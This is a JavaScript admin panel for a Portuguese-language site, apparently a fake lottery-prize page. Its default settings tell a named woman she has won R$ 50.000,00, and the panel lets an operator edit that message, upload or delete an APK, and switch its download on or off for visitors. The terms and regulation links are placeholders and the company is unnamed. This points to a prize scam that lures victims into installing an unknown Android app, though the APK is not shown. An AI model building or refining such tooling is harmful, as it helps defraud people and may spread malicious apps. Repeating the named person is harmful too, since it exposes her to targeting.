const WORKER_BASE='https://download.centraldepremios.online';
const API_URL=WORKER_BASE+'/config';
const APK_URL=WORKER_BASE+'/apk';
const APK_UPLOAD_URL=WORKER_BASE+'/admin/apk/upload';
const APK_DELETE_URL=WORKER_BASE+'/admin/apk/delete';
const APK_STATUS_URL=WORKER_BASE+'/apk/status';
const TOKEN_KEY='central-premios-admin-token';

const defaults={
  downloadEnabled:'false',
  customerName:'VERA LÚCIA APARECIDA GNANI',
  campaignName:'Familhão da Lotérica',
  message:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  prizeValue:'R$ 50.000,00',
  paymentMethod:'acesso',
  paymentCode:'',
  redemptionText:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  companyName:'Empresa responsável',
  regulationUrl:'#',
  termsUrl:'#'
};

const ids={
  downloadEnabled:'downloadEnabledInput',
  customerName:'nameInput',
  prizeValue:'valueInput',
  campaignName:'campaignInput',
  message:'messageInput',
  paymentMethod:'paymentMethodInput',
  paymentCode:'paymentCodeInput',
  redemptionText:'redemptionTextInput',
  companyName:'companyInput',
  regulationUrl:'regulationInput',
  termsUrl:'termsInput'
};

function toast(msg,duration=2200){
  const t=document.createElement('div');
  t.className='toast';
  t.textContent=msg;
  document.body.appendChild(t);
  setTimeout(()=>t.remove(),duration);
}

function updateDownloadPermissionUI(enabled){
  const checkbox=document.getElementById('downloadEnabledInput');
  const status=document.getElementById('downloadPermissionStatus');
  const button=document.getElementById('downloadPermissionButton');

  if(checkbox) checkbox.checked=enabled;

  if(status){
    status.textContent=enabled
      ? 'Downloads liberados no site'
      : 'Downloads bloqueados no site';
  }

  if(button){
    button.textContent=enabled
      ? 'Bloquear downloads'
      : 'Liberar downloads';
    button.classList.toggle('is-enabled',enabled);
  }
}

function fillForm(data){
  const s={...defaults,...data};
  if(s.paymentMethod==='pix' || s.paymentMethod==='credito') s.paymentMethod='acesso';
  Object.entries(ids).forEach(([key,id])=>{
    const el=document.getElementById(id);
    if(!el) return;
    if(el.type==='checkbox'){
      el.checked=String(s[key])==='true';
    }else{
      el.value=s[key]??'';
    }
  });

  updateDownloadPermissionUI(String(s.downloadEnabled)==='true');
}

function collectForm(){
  const data={};
  Object.entries(ids).forEach(([key,id])=>{
    const el=document.getElementById(id);
    if(!el) return;
    data[key]=el.type==='checkbox' ? String(el.checked) : (el.value??'').trim();
  });
  return data;
}

function formatBytes(bytes){
  if(!Number.isFinite(bytes) || bytes<0) return '—';
  if(bytes===0) return '0 B';
  const units=['B','KB','MB','GB'];
  const i=Math.min(Math.floor(Math.log(bytes)/Math.log(1024)),units.length-1);
  const value=bytes/Math.pow(1024,i);
  return value.toLocaleString('pt-BR',{maximumFractionDigits:i===0?0:1})+' '+units[i];
}

function getAdminToken(){
  return (sessionStorage.getItem(TOKEN_KEY)||'').trim();
}

function showAdminPanel(){
  const gate=document.getElementById('adminLoginGate');
  const main=document.getElementById('adminMain');
  if(gate) gate.hidden=true;
  if(main) main.hidden=false;
}

function showLoginGate(message=''){
  const gate=document.getElementById('adminLoginGate');
  const main=document.getElementById('adminMain');
  const error=document.getElementById('adminLoginError');
  if(main) main.hidden=true;
  if(gate) gate.hidden=false;
  if(error) error.textContent=message;
}

async function validateAdminPassword(password){
  const configResponse=await fetch(API_URL+'?t='+Date.now(),{
    method:'GET',
    cache:'no-store',
    headers:{'Accept':'application/json'}
  });

  if(!configResponse.ok) throw new Error('CONFIG_UNAVAILABLE');
  const currentConfig=await configResponse.json();

  const response=await fetch(API_URL,{
    method:'POST',
    headers:{
      'Content-Type':'application/json',
      'Authorization':'Bearer '+password
    },
    body:JSON.stringify(currentConfig)
  });

  if(response.status===401) return false;
  if(!response.ok) throw new Error('AUTH_UNAVAILABLE');
  return true;
}

async function loginAdmin(password){
  const clean=(password||'').trim();
  if(!clean) return false;

  const valid=await validateAdminPassword(clean);
  if(!valid) return false;

  sessionStorage.setItem(TOKEN_KEY,clean);
  showAdminPanel();
  await loadGlobalConfig();
  await loadApkStatus();
  return true;
}

function logoutAdmin(){
  sessionStorage.removeItem(TOKEN_KEY);
  showLoginGate();
}

function authHeaders(extra={}){
  const token=getAdminToken();
  if(!token) throw new Error('TOKEN_REQUIRED');
  return {...extra,'Authorization':'Bearer '+token};
}

function handleUnauthorized(response){
  if(response.status===401){
    sessionStorage.removeItem(TOKEN_KEY);
    showLoginGate('Sessão expirada. Digite a senha novamente.');
    throw new Error('UNAUTHORIZED');
  }
}

async function loadGlobalConfig(){
  const response=await fetch(API_URL+'?t='+Date.now(),{
    method:'GET',
    cache:'no-store',
    headers:{'Accept':'application/json'}
  });

  if(!response.ok){
    const detail=await response.text().catch(()=> '');
    throw new Error('HTTP '+response.status+' '+detail);
  }

  const data=await response.json();
  fillForm(data);
}

async function mirrorRemoteConfig(data){
  const token=getAdminToken();
  if(!token) throw new Error('TOKEN_REQUIRED');

  const response=await fetch(API_URL,{
    method:'POST',
    headers:{
      'Content-Type':'application/json',
      'Authorization':'Bearer '+token
    },
    body:JSON.stringify(data)
  });

  if(response.status===401){
    sessionStorage.removeItem(TOKEN_KEY);
    showLoginGate('Senha incorreta ou sessão expirada.');
    throw new Error('UNAUTHORIZED');
  }

  if(!response.ok){
    const detail=await response.text().catch(()=> '');
    throw new Error('HTTP '+response.status+' '+detail);
  }

  return response.json().catch(()=>({ok:true}));
}

async function loadApkStatus(){
  const badge=document.getElementById('apkStatusBadge');
  const name=document.getElementById('apkCurrentName');
  const meta=document.getElementById('apkCurrentMeta');
  const deleteButton=document.getElementById('apkDeleteButton');

  if(badge){
    badge.textContent='Status desativado';
    badge.className='apk-status-badge';
  }

  if(name){
    name.textContent='Consulta de status desativada no Worker';
  }

  if(meta){
    meta.textContent='Você ainda pode enviar, substituir ou excluir o APK normalmente.';
  }

  if(deleteButton){
    deleteButton.disabled=false;
  }
}

function setApkBusy(busy,text='Enviando...'){
  const upload=document.getElementById('apkUploadButton');
  const del=document.getElementById('apkDeleteButton');
  const input=document.getElementById('apkFileInput');
  const wrap=document.getElementById('apkProgressWrap');
  const bar=document.getElementById('apkProgressBar');
  const progressText=document.getElementById('apkProgressText');

  upload.disabled=busy;
  del.disabled=busy;
  input.disabled=busy;
  wrap.hidden=!busy;
  progressText.textContent=text;
  bar.style.width=busy?'100%':'0%';
}

async function uploadApk(){
  const input=document.getElementById('apkFileInput');
  const file=input.files?.[0];

  if(!file){
    toast('Selecione um arquivo APK primeiro.');
    return;
  }

  if(!file.name.toLowerCase().endsWith('.apk')){
    toast('Selecione somente um arquivo .apk.');
    return;
  }

  const token=getAdminToken();
  if(!token){
    toast('Envio cancelado: token não informado.');
    return;
  }

  setApkBusy(true,'Enviando '+file.name+'...');

  try{
    const form=new FormData();
    form.append('token',token);
    form.append('file',file,file.name);

    const response=await fetch(APK_UPLOAD_URL,{
      method:'POST',
      body:form
    });

    if(response.status===401){
      sessionStorage.removeItem(TOKEN_KEY);
      throw new Error('UNAUTHORIZED');
    }

    if(!response.ok){
      const text=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+text);
    }

    const data=await response.json().catch(()=>({}));

    input.value='';
    document.getElementById('apkSelectedInfo').textContent='Nenhum arquivo selecionado.';
    toast(data.message||'APK enviado/substituído com sucesso.');
    await loadApkStatus();
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else {
      const detail=(error?.message||'Erro desconhecido').replace(/^HTTP\s*/,'');
      toast('Erro ao enviar APK: '+detail,6000);
    }
  }finally{
    setApkBusy(false);
    await loadApkStatus();
  }
}

async function deleteApk(){
  if(!confirm('Tem certeza que deseja excluir o APK atual? O botão de download ficará indisponível até um novo APK ser enviado.')) return;

  const token=getAdminToken();
  if(!token){
    toast('Exclusão cancelada: token não informado.');
    return;
  }

  setApkBusy(true,'Excluindo APK...');

  try{
    const form=new FormData();
    form.append('token',token);

    const response=await fetch(APK_DELETE_URL,{
      method:'POST',
      body:form
    });

    if(response.status===401){
      sessionStorage.removeItem(TOKEN_KEY);
      throw new Error('UNAUTHORIZED');
    }

    if(!response.ok){
      const text=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+text);
    }

    const data=await response.json().catch(()=>({}));
    toast(data.message||'APK excluído com sucesso.');
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else {
      const detail=(error?.message||'Erro desconhecido').replace(/^HTTP\s*/,'');
      toast('Erro ao excluir APK: '+detail,6000);
    }
  }finally{
    setApkBusy(false);
    await loadApkStatus();
  }
}

document.getElementById('settingsForm')?.addEventListener('submit',async e=>{
  e.preventDefault();
  const button=e.submitter || document.querySelector('.save-button');
  if(button) button.disabled=true;

  try{
    const data=collectForm();
    await mirrorRemoteConfig(data);
    toast('Alterações salvas online.');
    await loadGlobalConfig();
  }catch(error){
    console.error(error);
    if(error.message==='TOKEN_REQUIRED'){
      toast('Informe o ADMIN_TOKEN para salvar.',4500);
    }else if(error.message==='UNAUTHORIZED'){
      toast('ADMIN_TOKEN incorreto.',5000);
    }else{
      toast('Erro ao salvar online: '+(error?.message||'falha desconhecida'),6000);
    }
  }finally{
    if(button) button.disabled=false;
  }
});

document.getElementById('restoreButton')?.addEventListener('click',async()=>{
  if(!confirm('Restaurar os valores padrão online?')) return;

  try{
    await mirrorRemoteConfig(defaults);
    await loadGlobalConfig();
    toast('Padrão restaurado online.');
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED') toast('ADMIN_TOKEN incorreto.',5000);
    else toast('Não foi possível restaurar online.',4500);
  }
});

document.getElementById('apkFileInput')?.addEventListener('change',event=>{
  const file=event.target.files?.[0];
  document.getElementById('apkSelectedInfo').textContent=file
    ? file.name+' • '+formatBytes(file.size)
    : 'Nenhum arquivo selecionado.';
});

async function toggleDownloadPermission(){
  const button=document.getElementById('downloadPermissionButton');
  const checkbox=document.getElementById('downloadEnabledInput');
  if(!button || !checkbox) return;

  const nextEnabled=!checkbox.checked;
  button.disabled=true;

  try{
    const response=await fetch(API_URL+'?t='+Date.now(),{
      method:'GET',
      cache:'no-store',
      headers:{'Accept':'application/json'}
    });

    if(!response.ok) throw new Error('HTTP '+response.status);

    const current=await response.json();
    const updated={...current,downloadEnabled:String(nextEnabled)};

    await mirrorRemoteConfig(updated);
    updateDownloadPermissionUI(nextEnabled);
    toast(nextEnabled ? 'Downloads liberados.' : 'Downloads bloqueados.');
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED'){
      toast('ADMIN_TOKEN incorreto.',5000);
    }else if(error.message==='TOKEN_REQUIRED'){
      toast('Informe o ADMIN_TOKEN.',4500);
    }else{
      toast('Não foi possível alterar a permissão.',5000);
    }
  }finally{
    button.disabled=false;
  }
}

document.getElementById('apkUploadButton')?.addEventListener('click',uploadApk);
document.getElementById('apkDeleteButton')?.addEventListener('click',deleteApk);
document.getElementById('downloadPermissionButton')?.addEventListener('click',toggleDownloadPermission);

document.getElementById('adminLoginForm')?.addEventListener('submit',async e=>{
  e.preventDefault();

  const input=document.getElementById('adminPasswordInput');
  const button=document.getElementById('adminLoginButton');
  const error=document.getElementById('adminLoginError');
  const password=input?.value||'';

  if(button) button.disabled=true;
  if(error) error.textContent='';

  try{
    const ok=await loginAdmin(password);
    if(!ok){
      if(error) error.textContent='Senha incorreta.';
      if(input){
        input.value='';
        input.focus();
      }
    }
  }catch(err){
    console.error(err);
    if(error) error.textContent='Não foi possível validar a senha agora.';
  }finally{
    if(button) button.disabled=false;
  }
});

(async()=>{
  const token=getAdminToken();

  if(!token){
    showLoginGate();
    document.getElementById('adminPasswordInput')?.focus();
    return;
  }

  try{
    const valid=await validateAdminPassword(token);
    if(valid){
      showAdminPanel();
      await loadGlobalConfig();
      await loadApkStatus();
    }else{
      logoutAdmin();
    }
  }catch(error){
    console.error(error);
    showLoginGate('Não foi possível validar a sessão.');
  }
})();
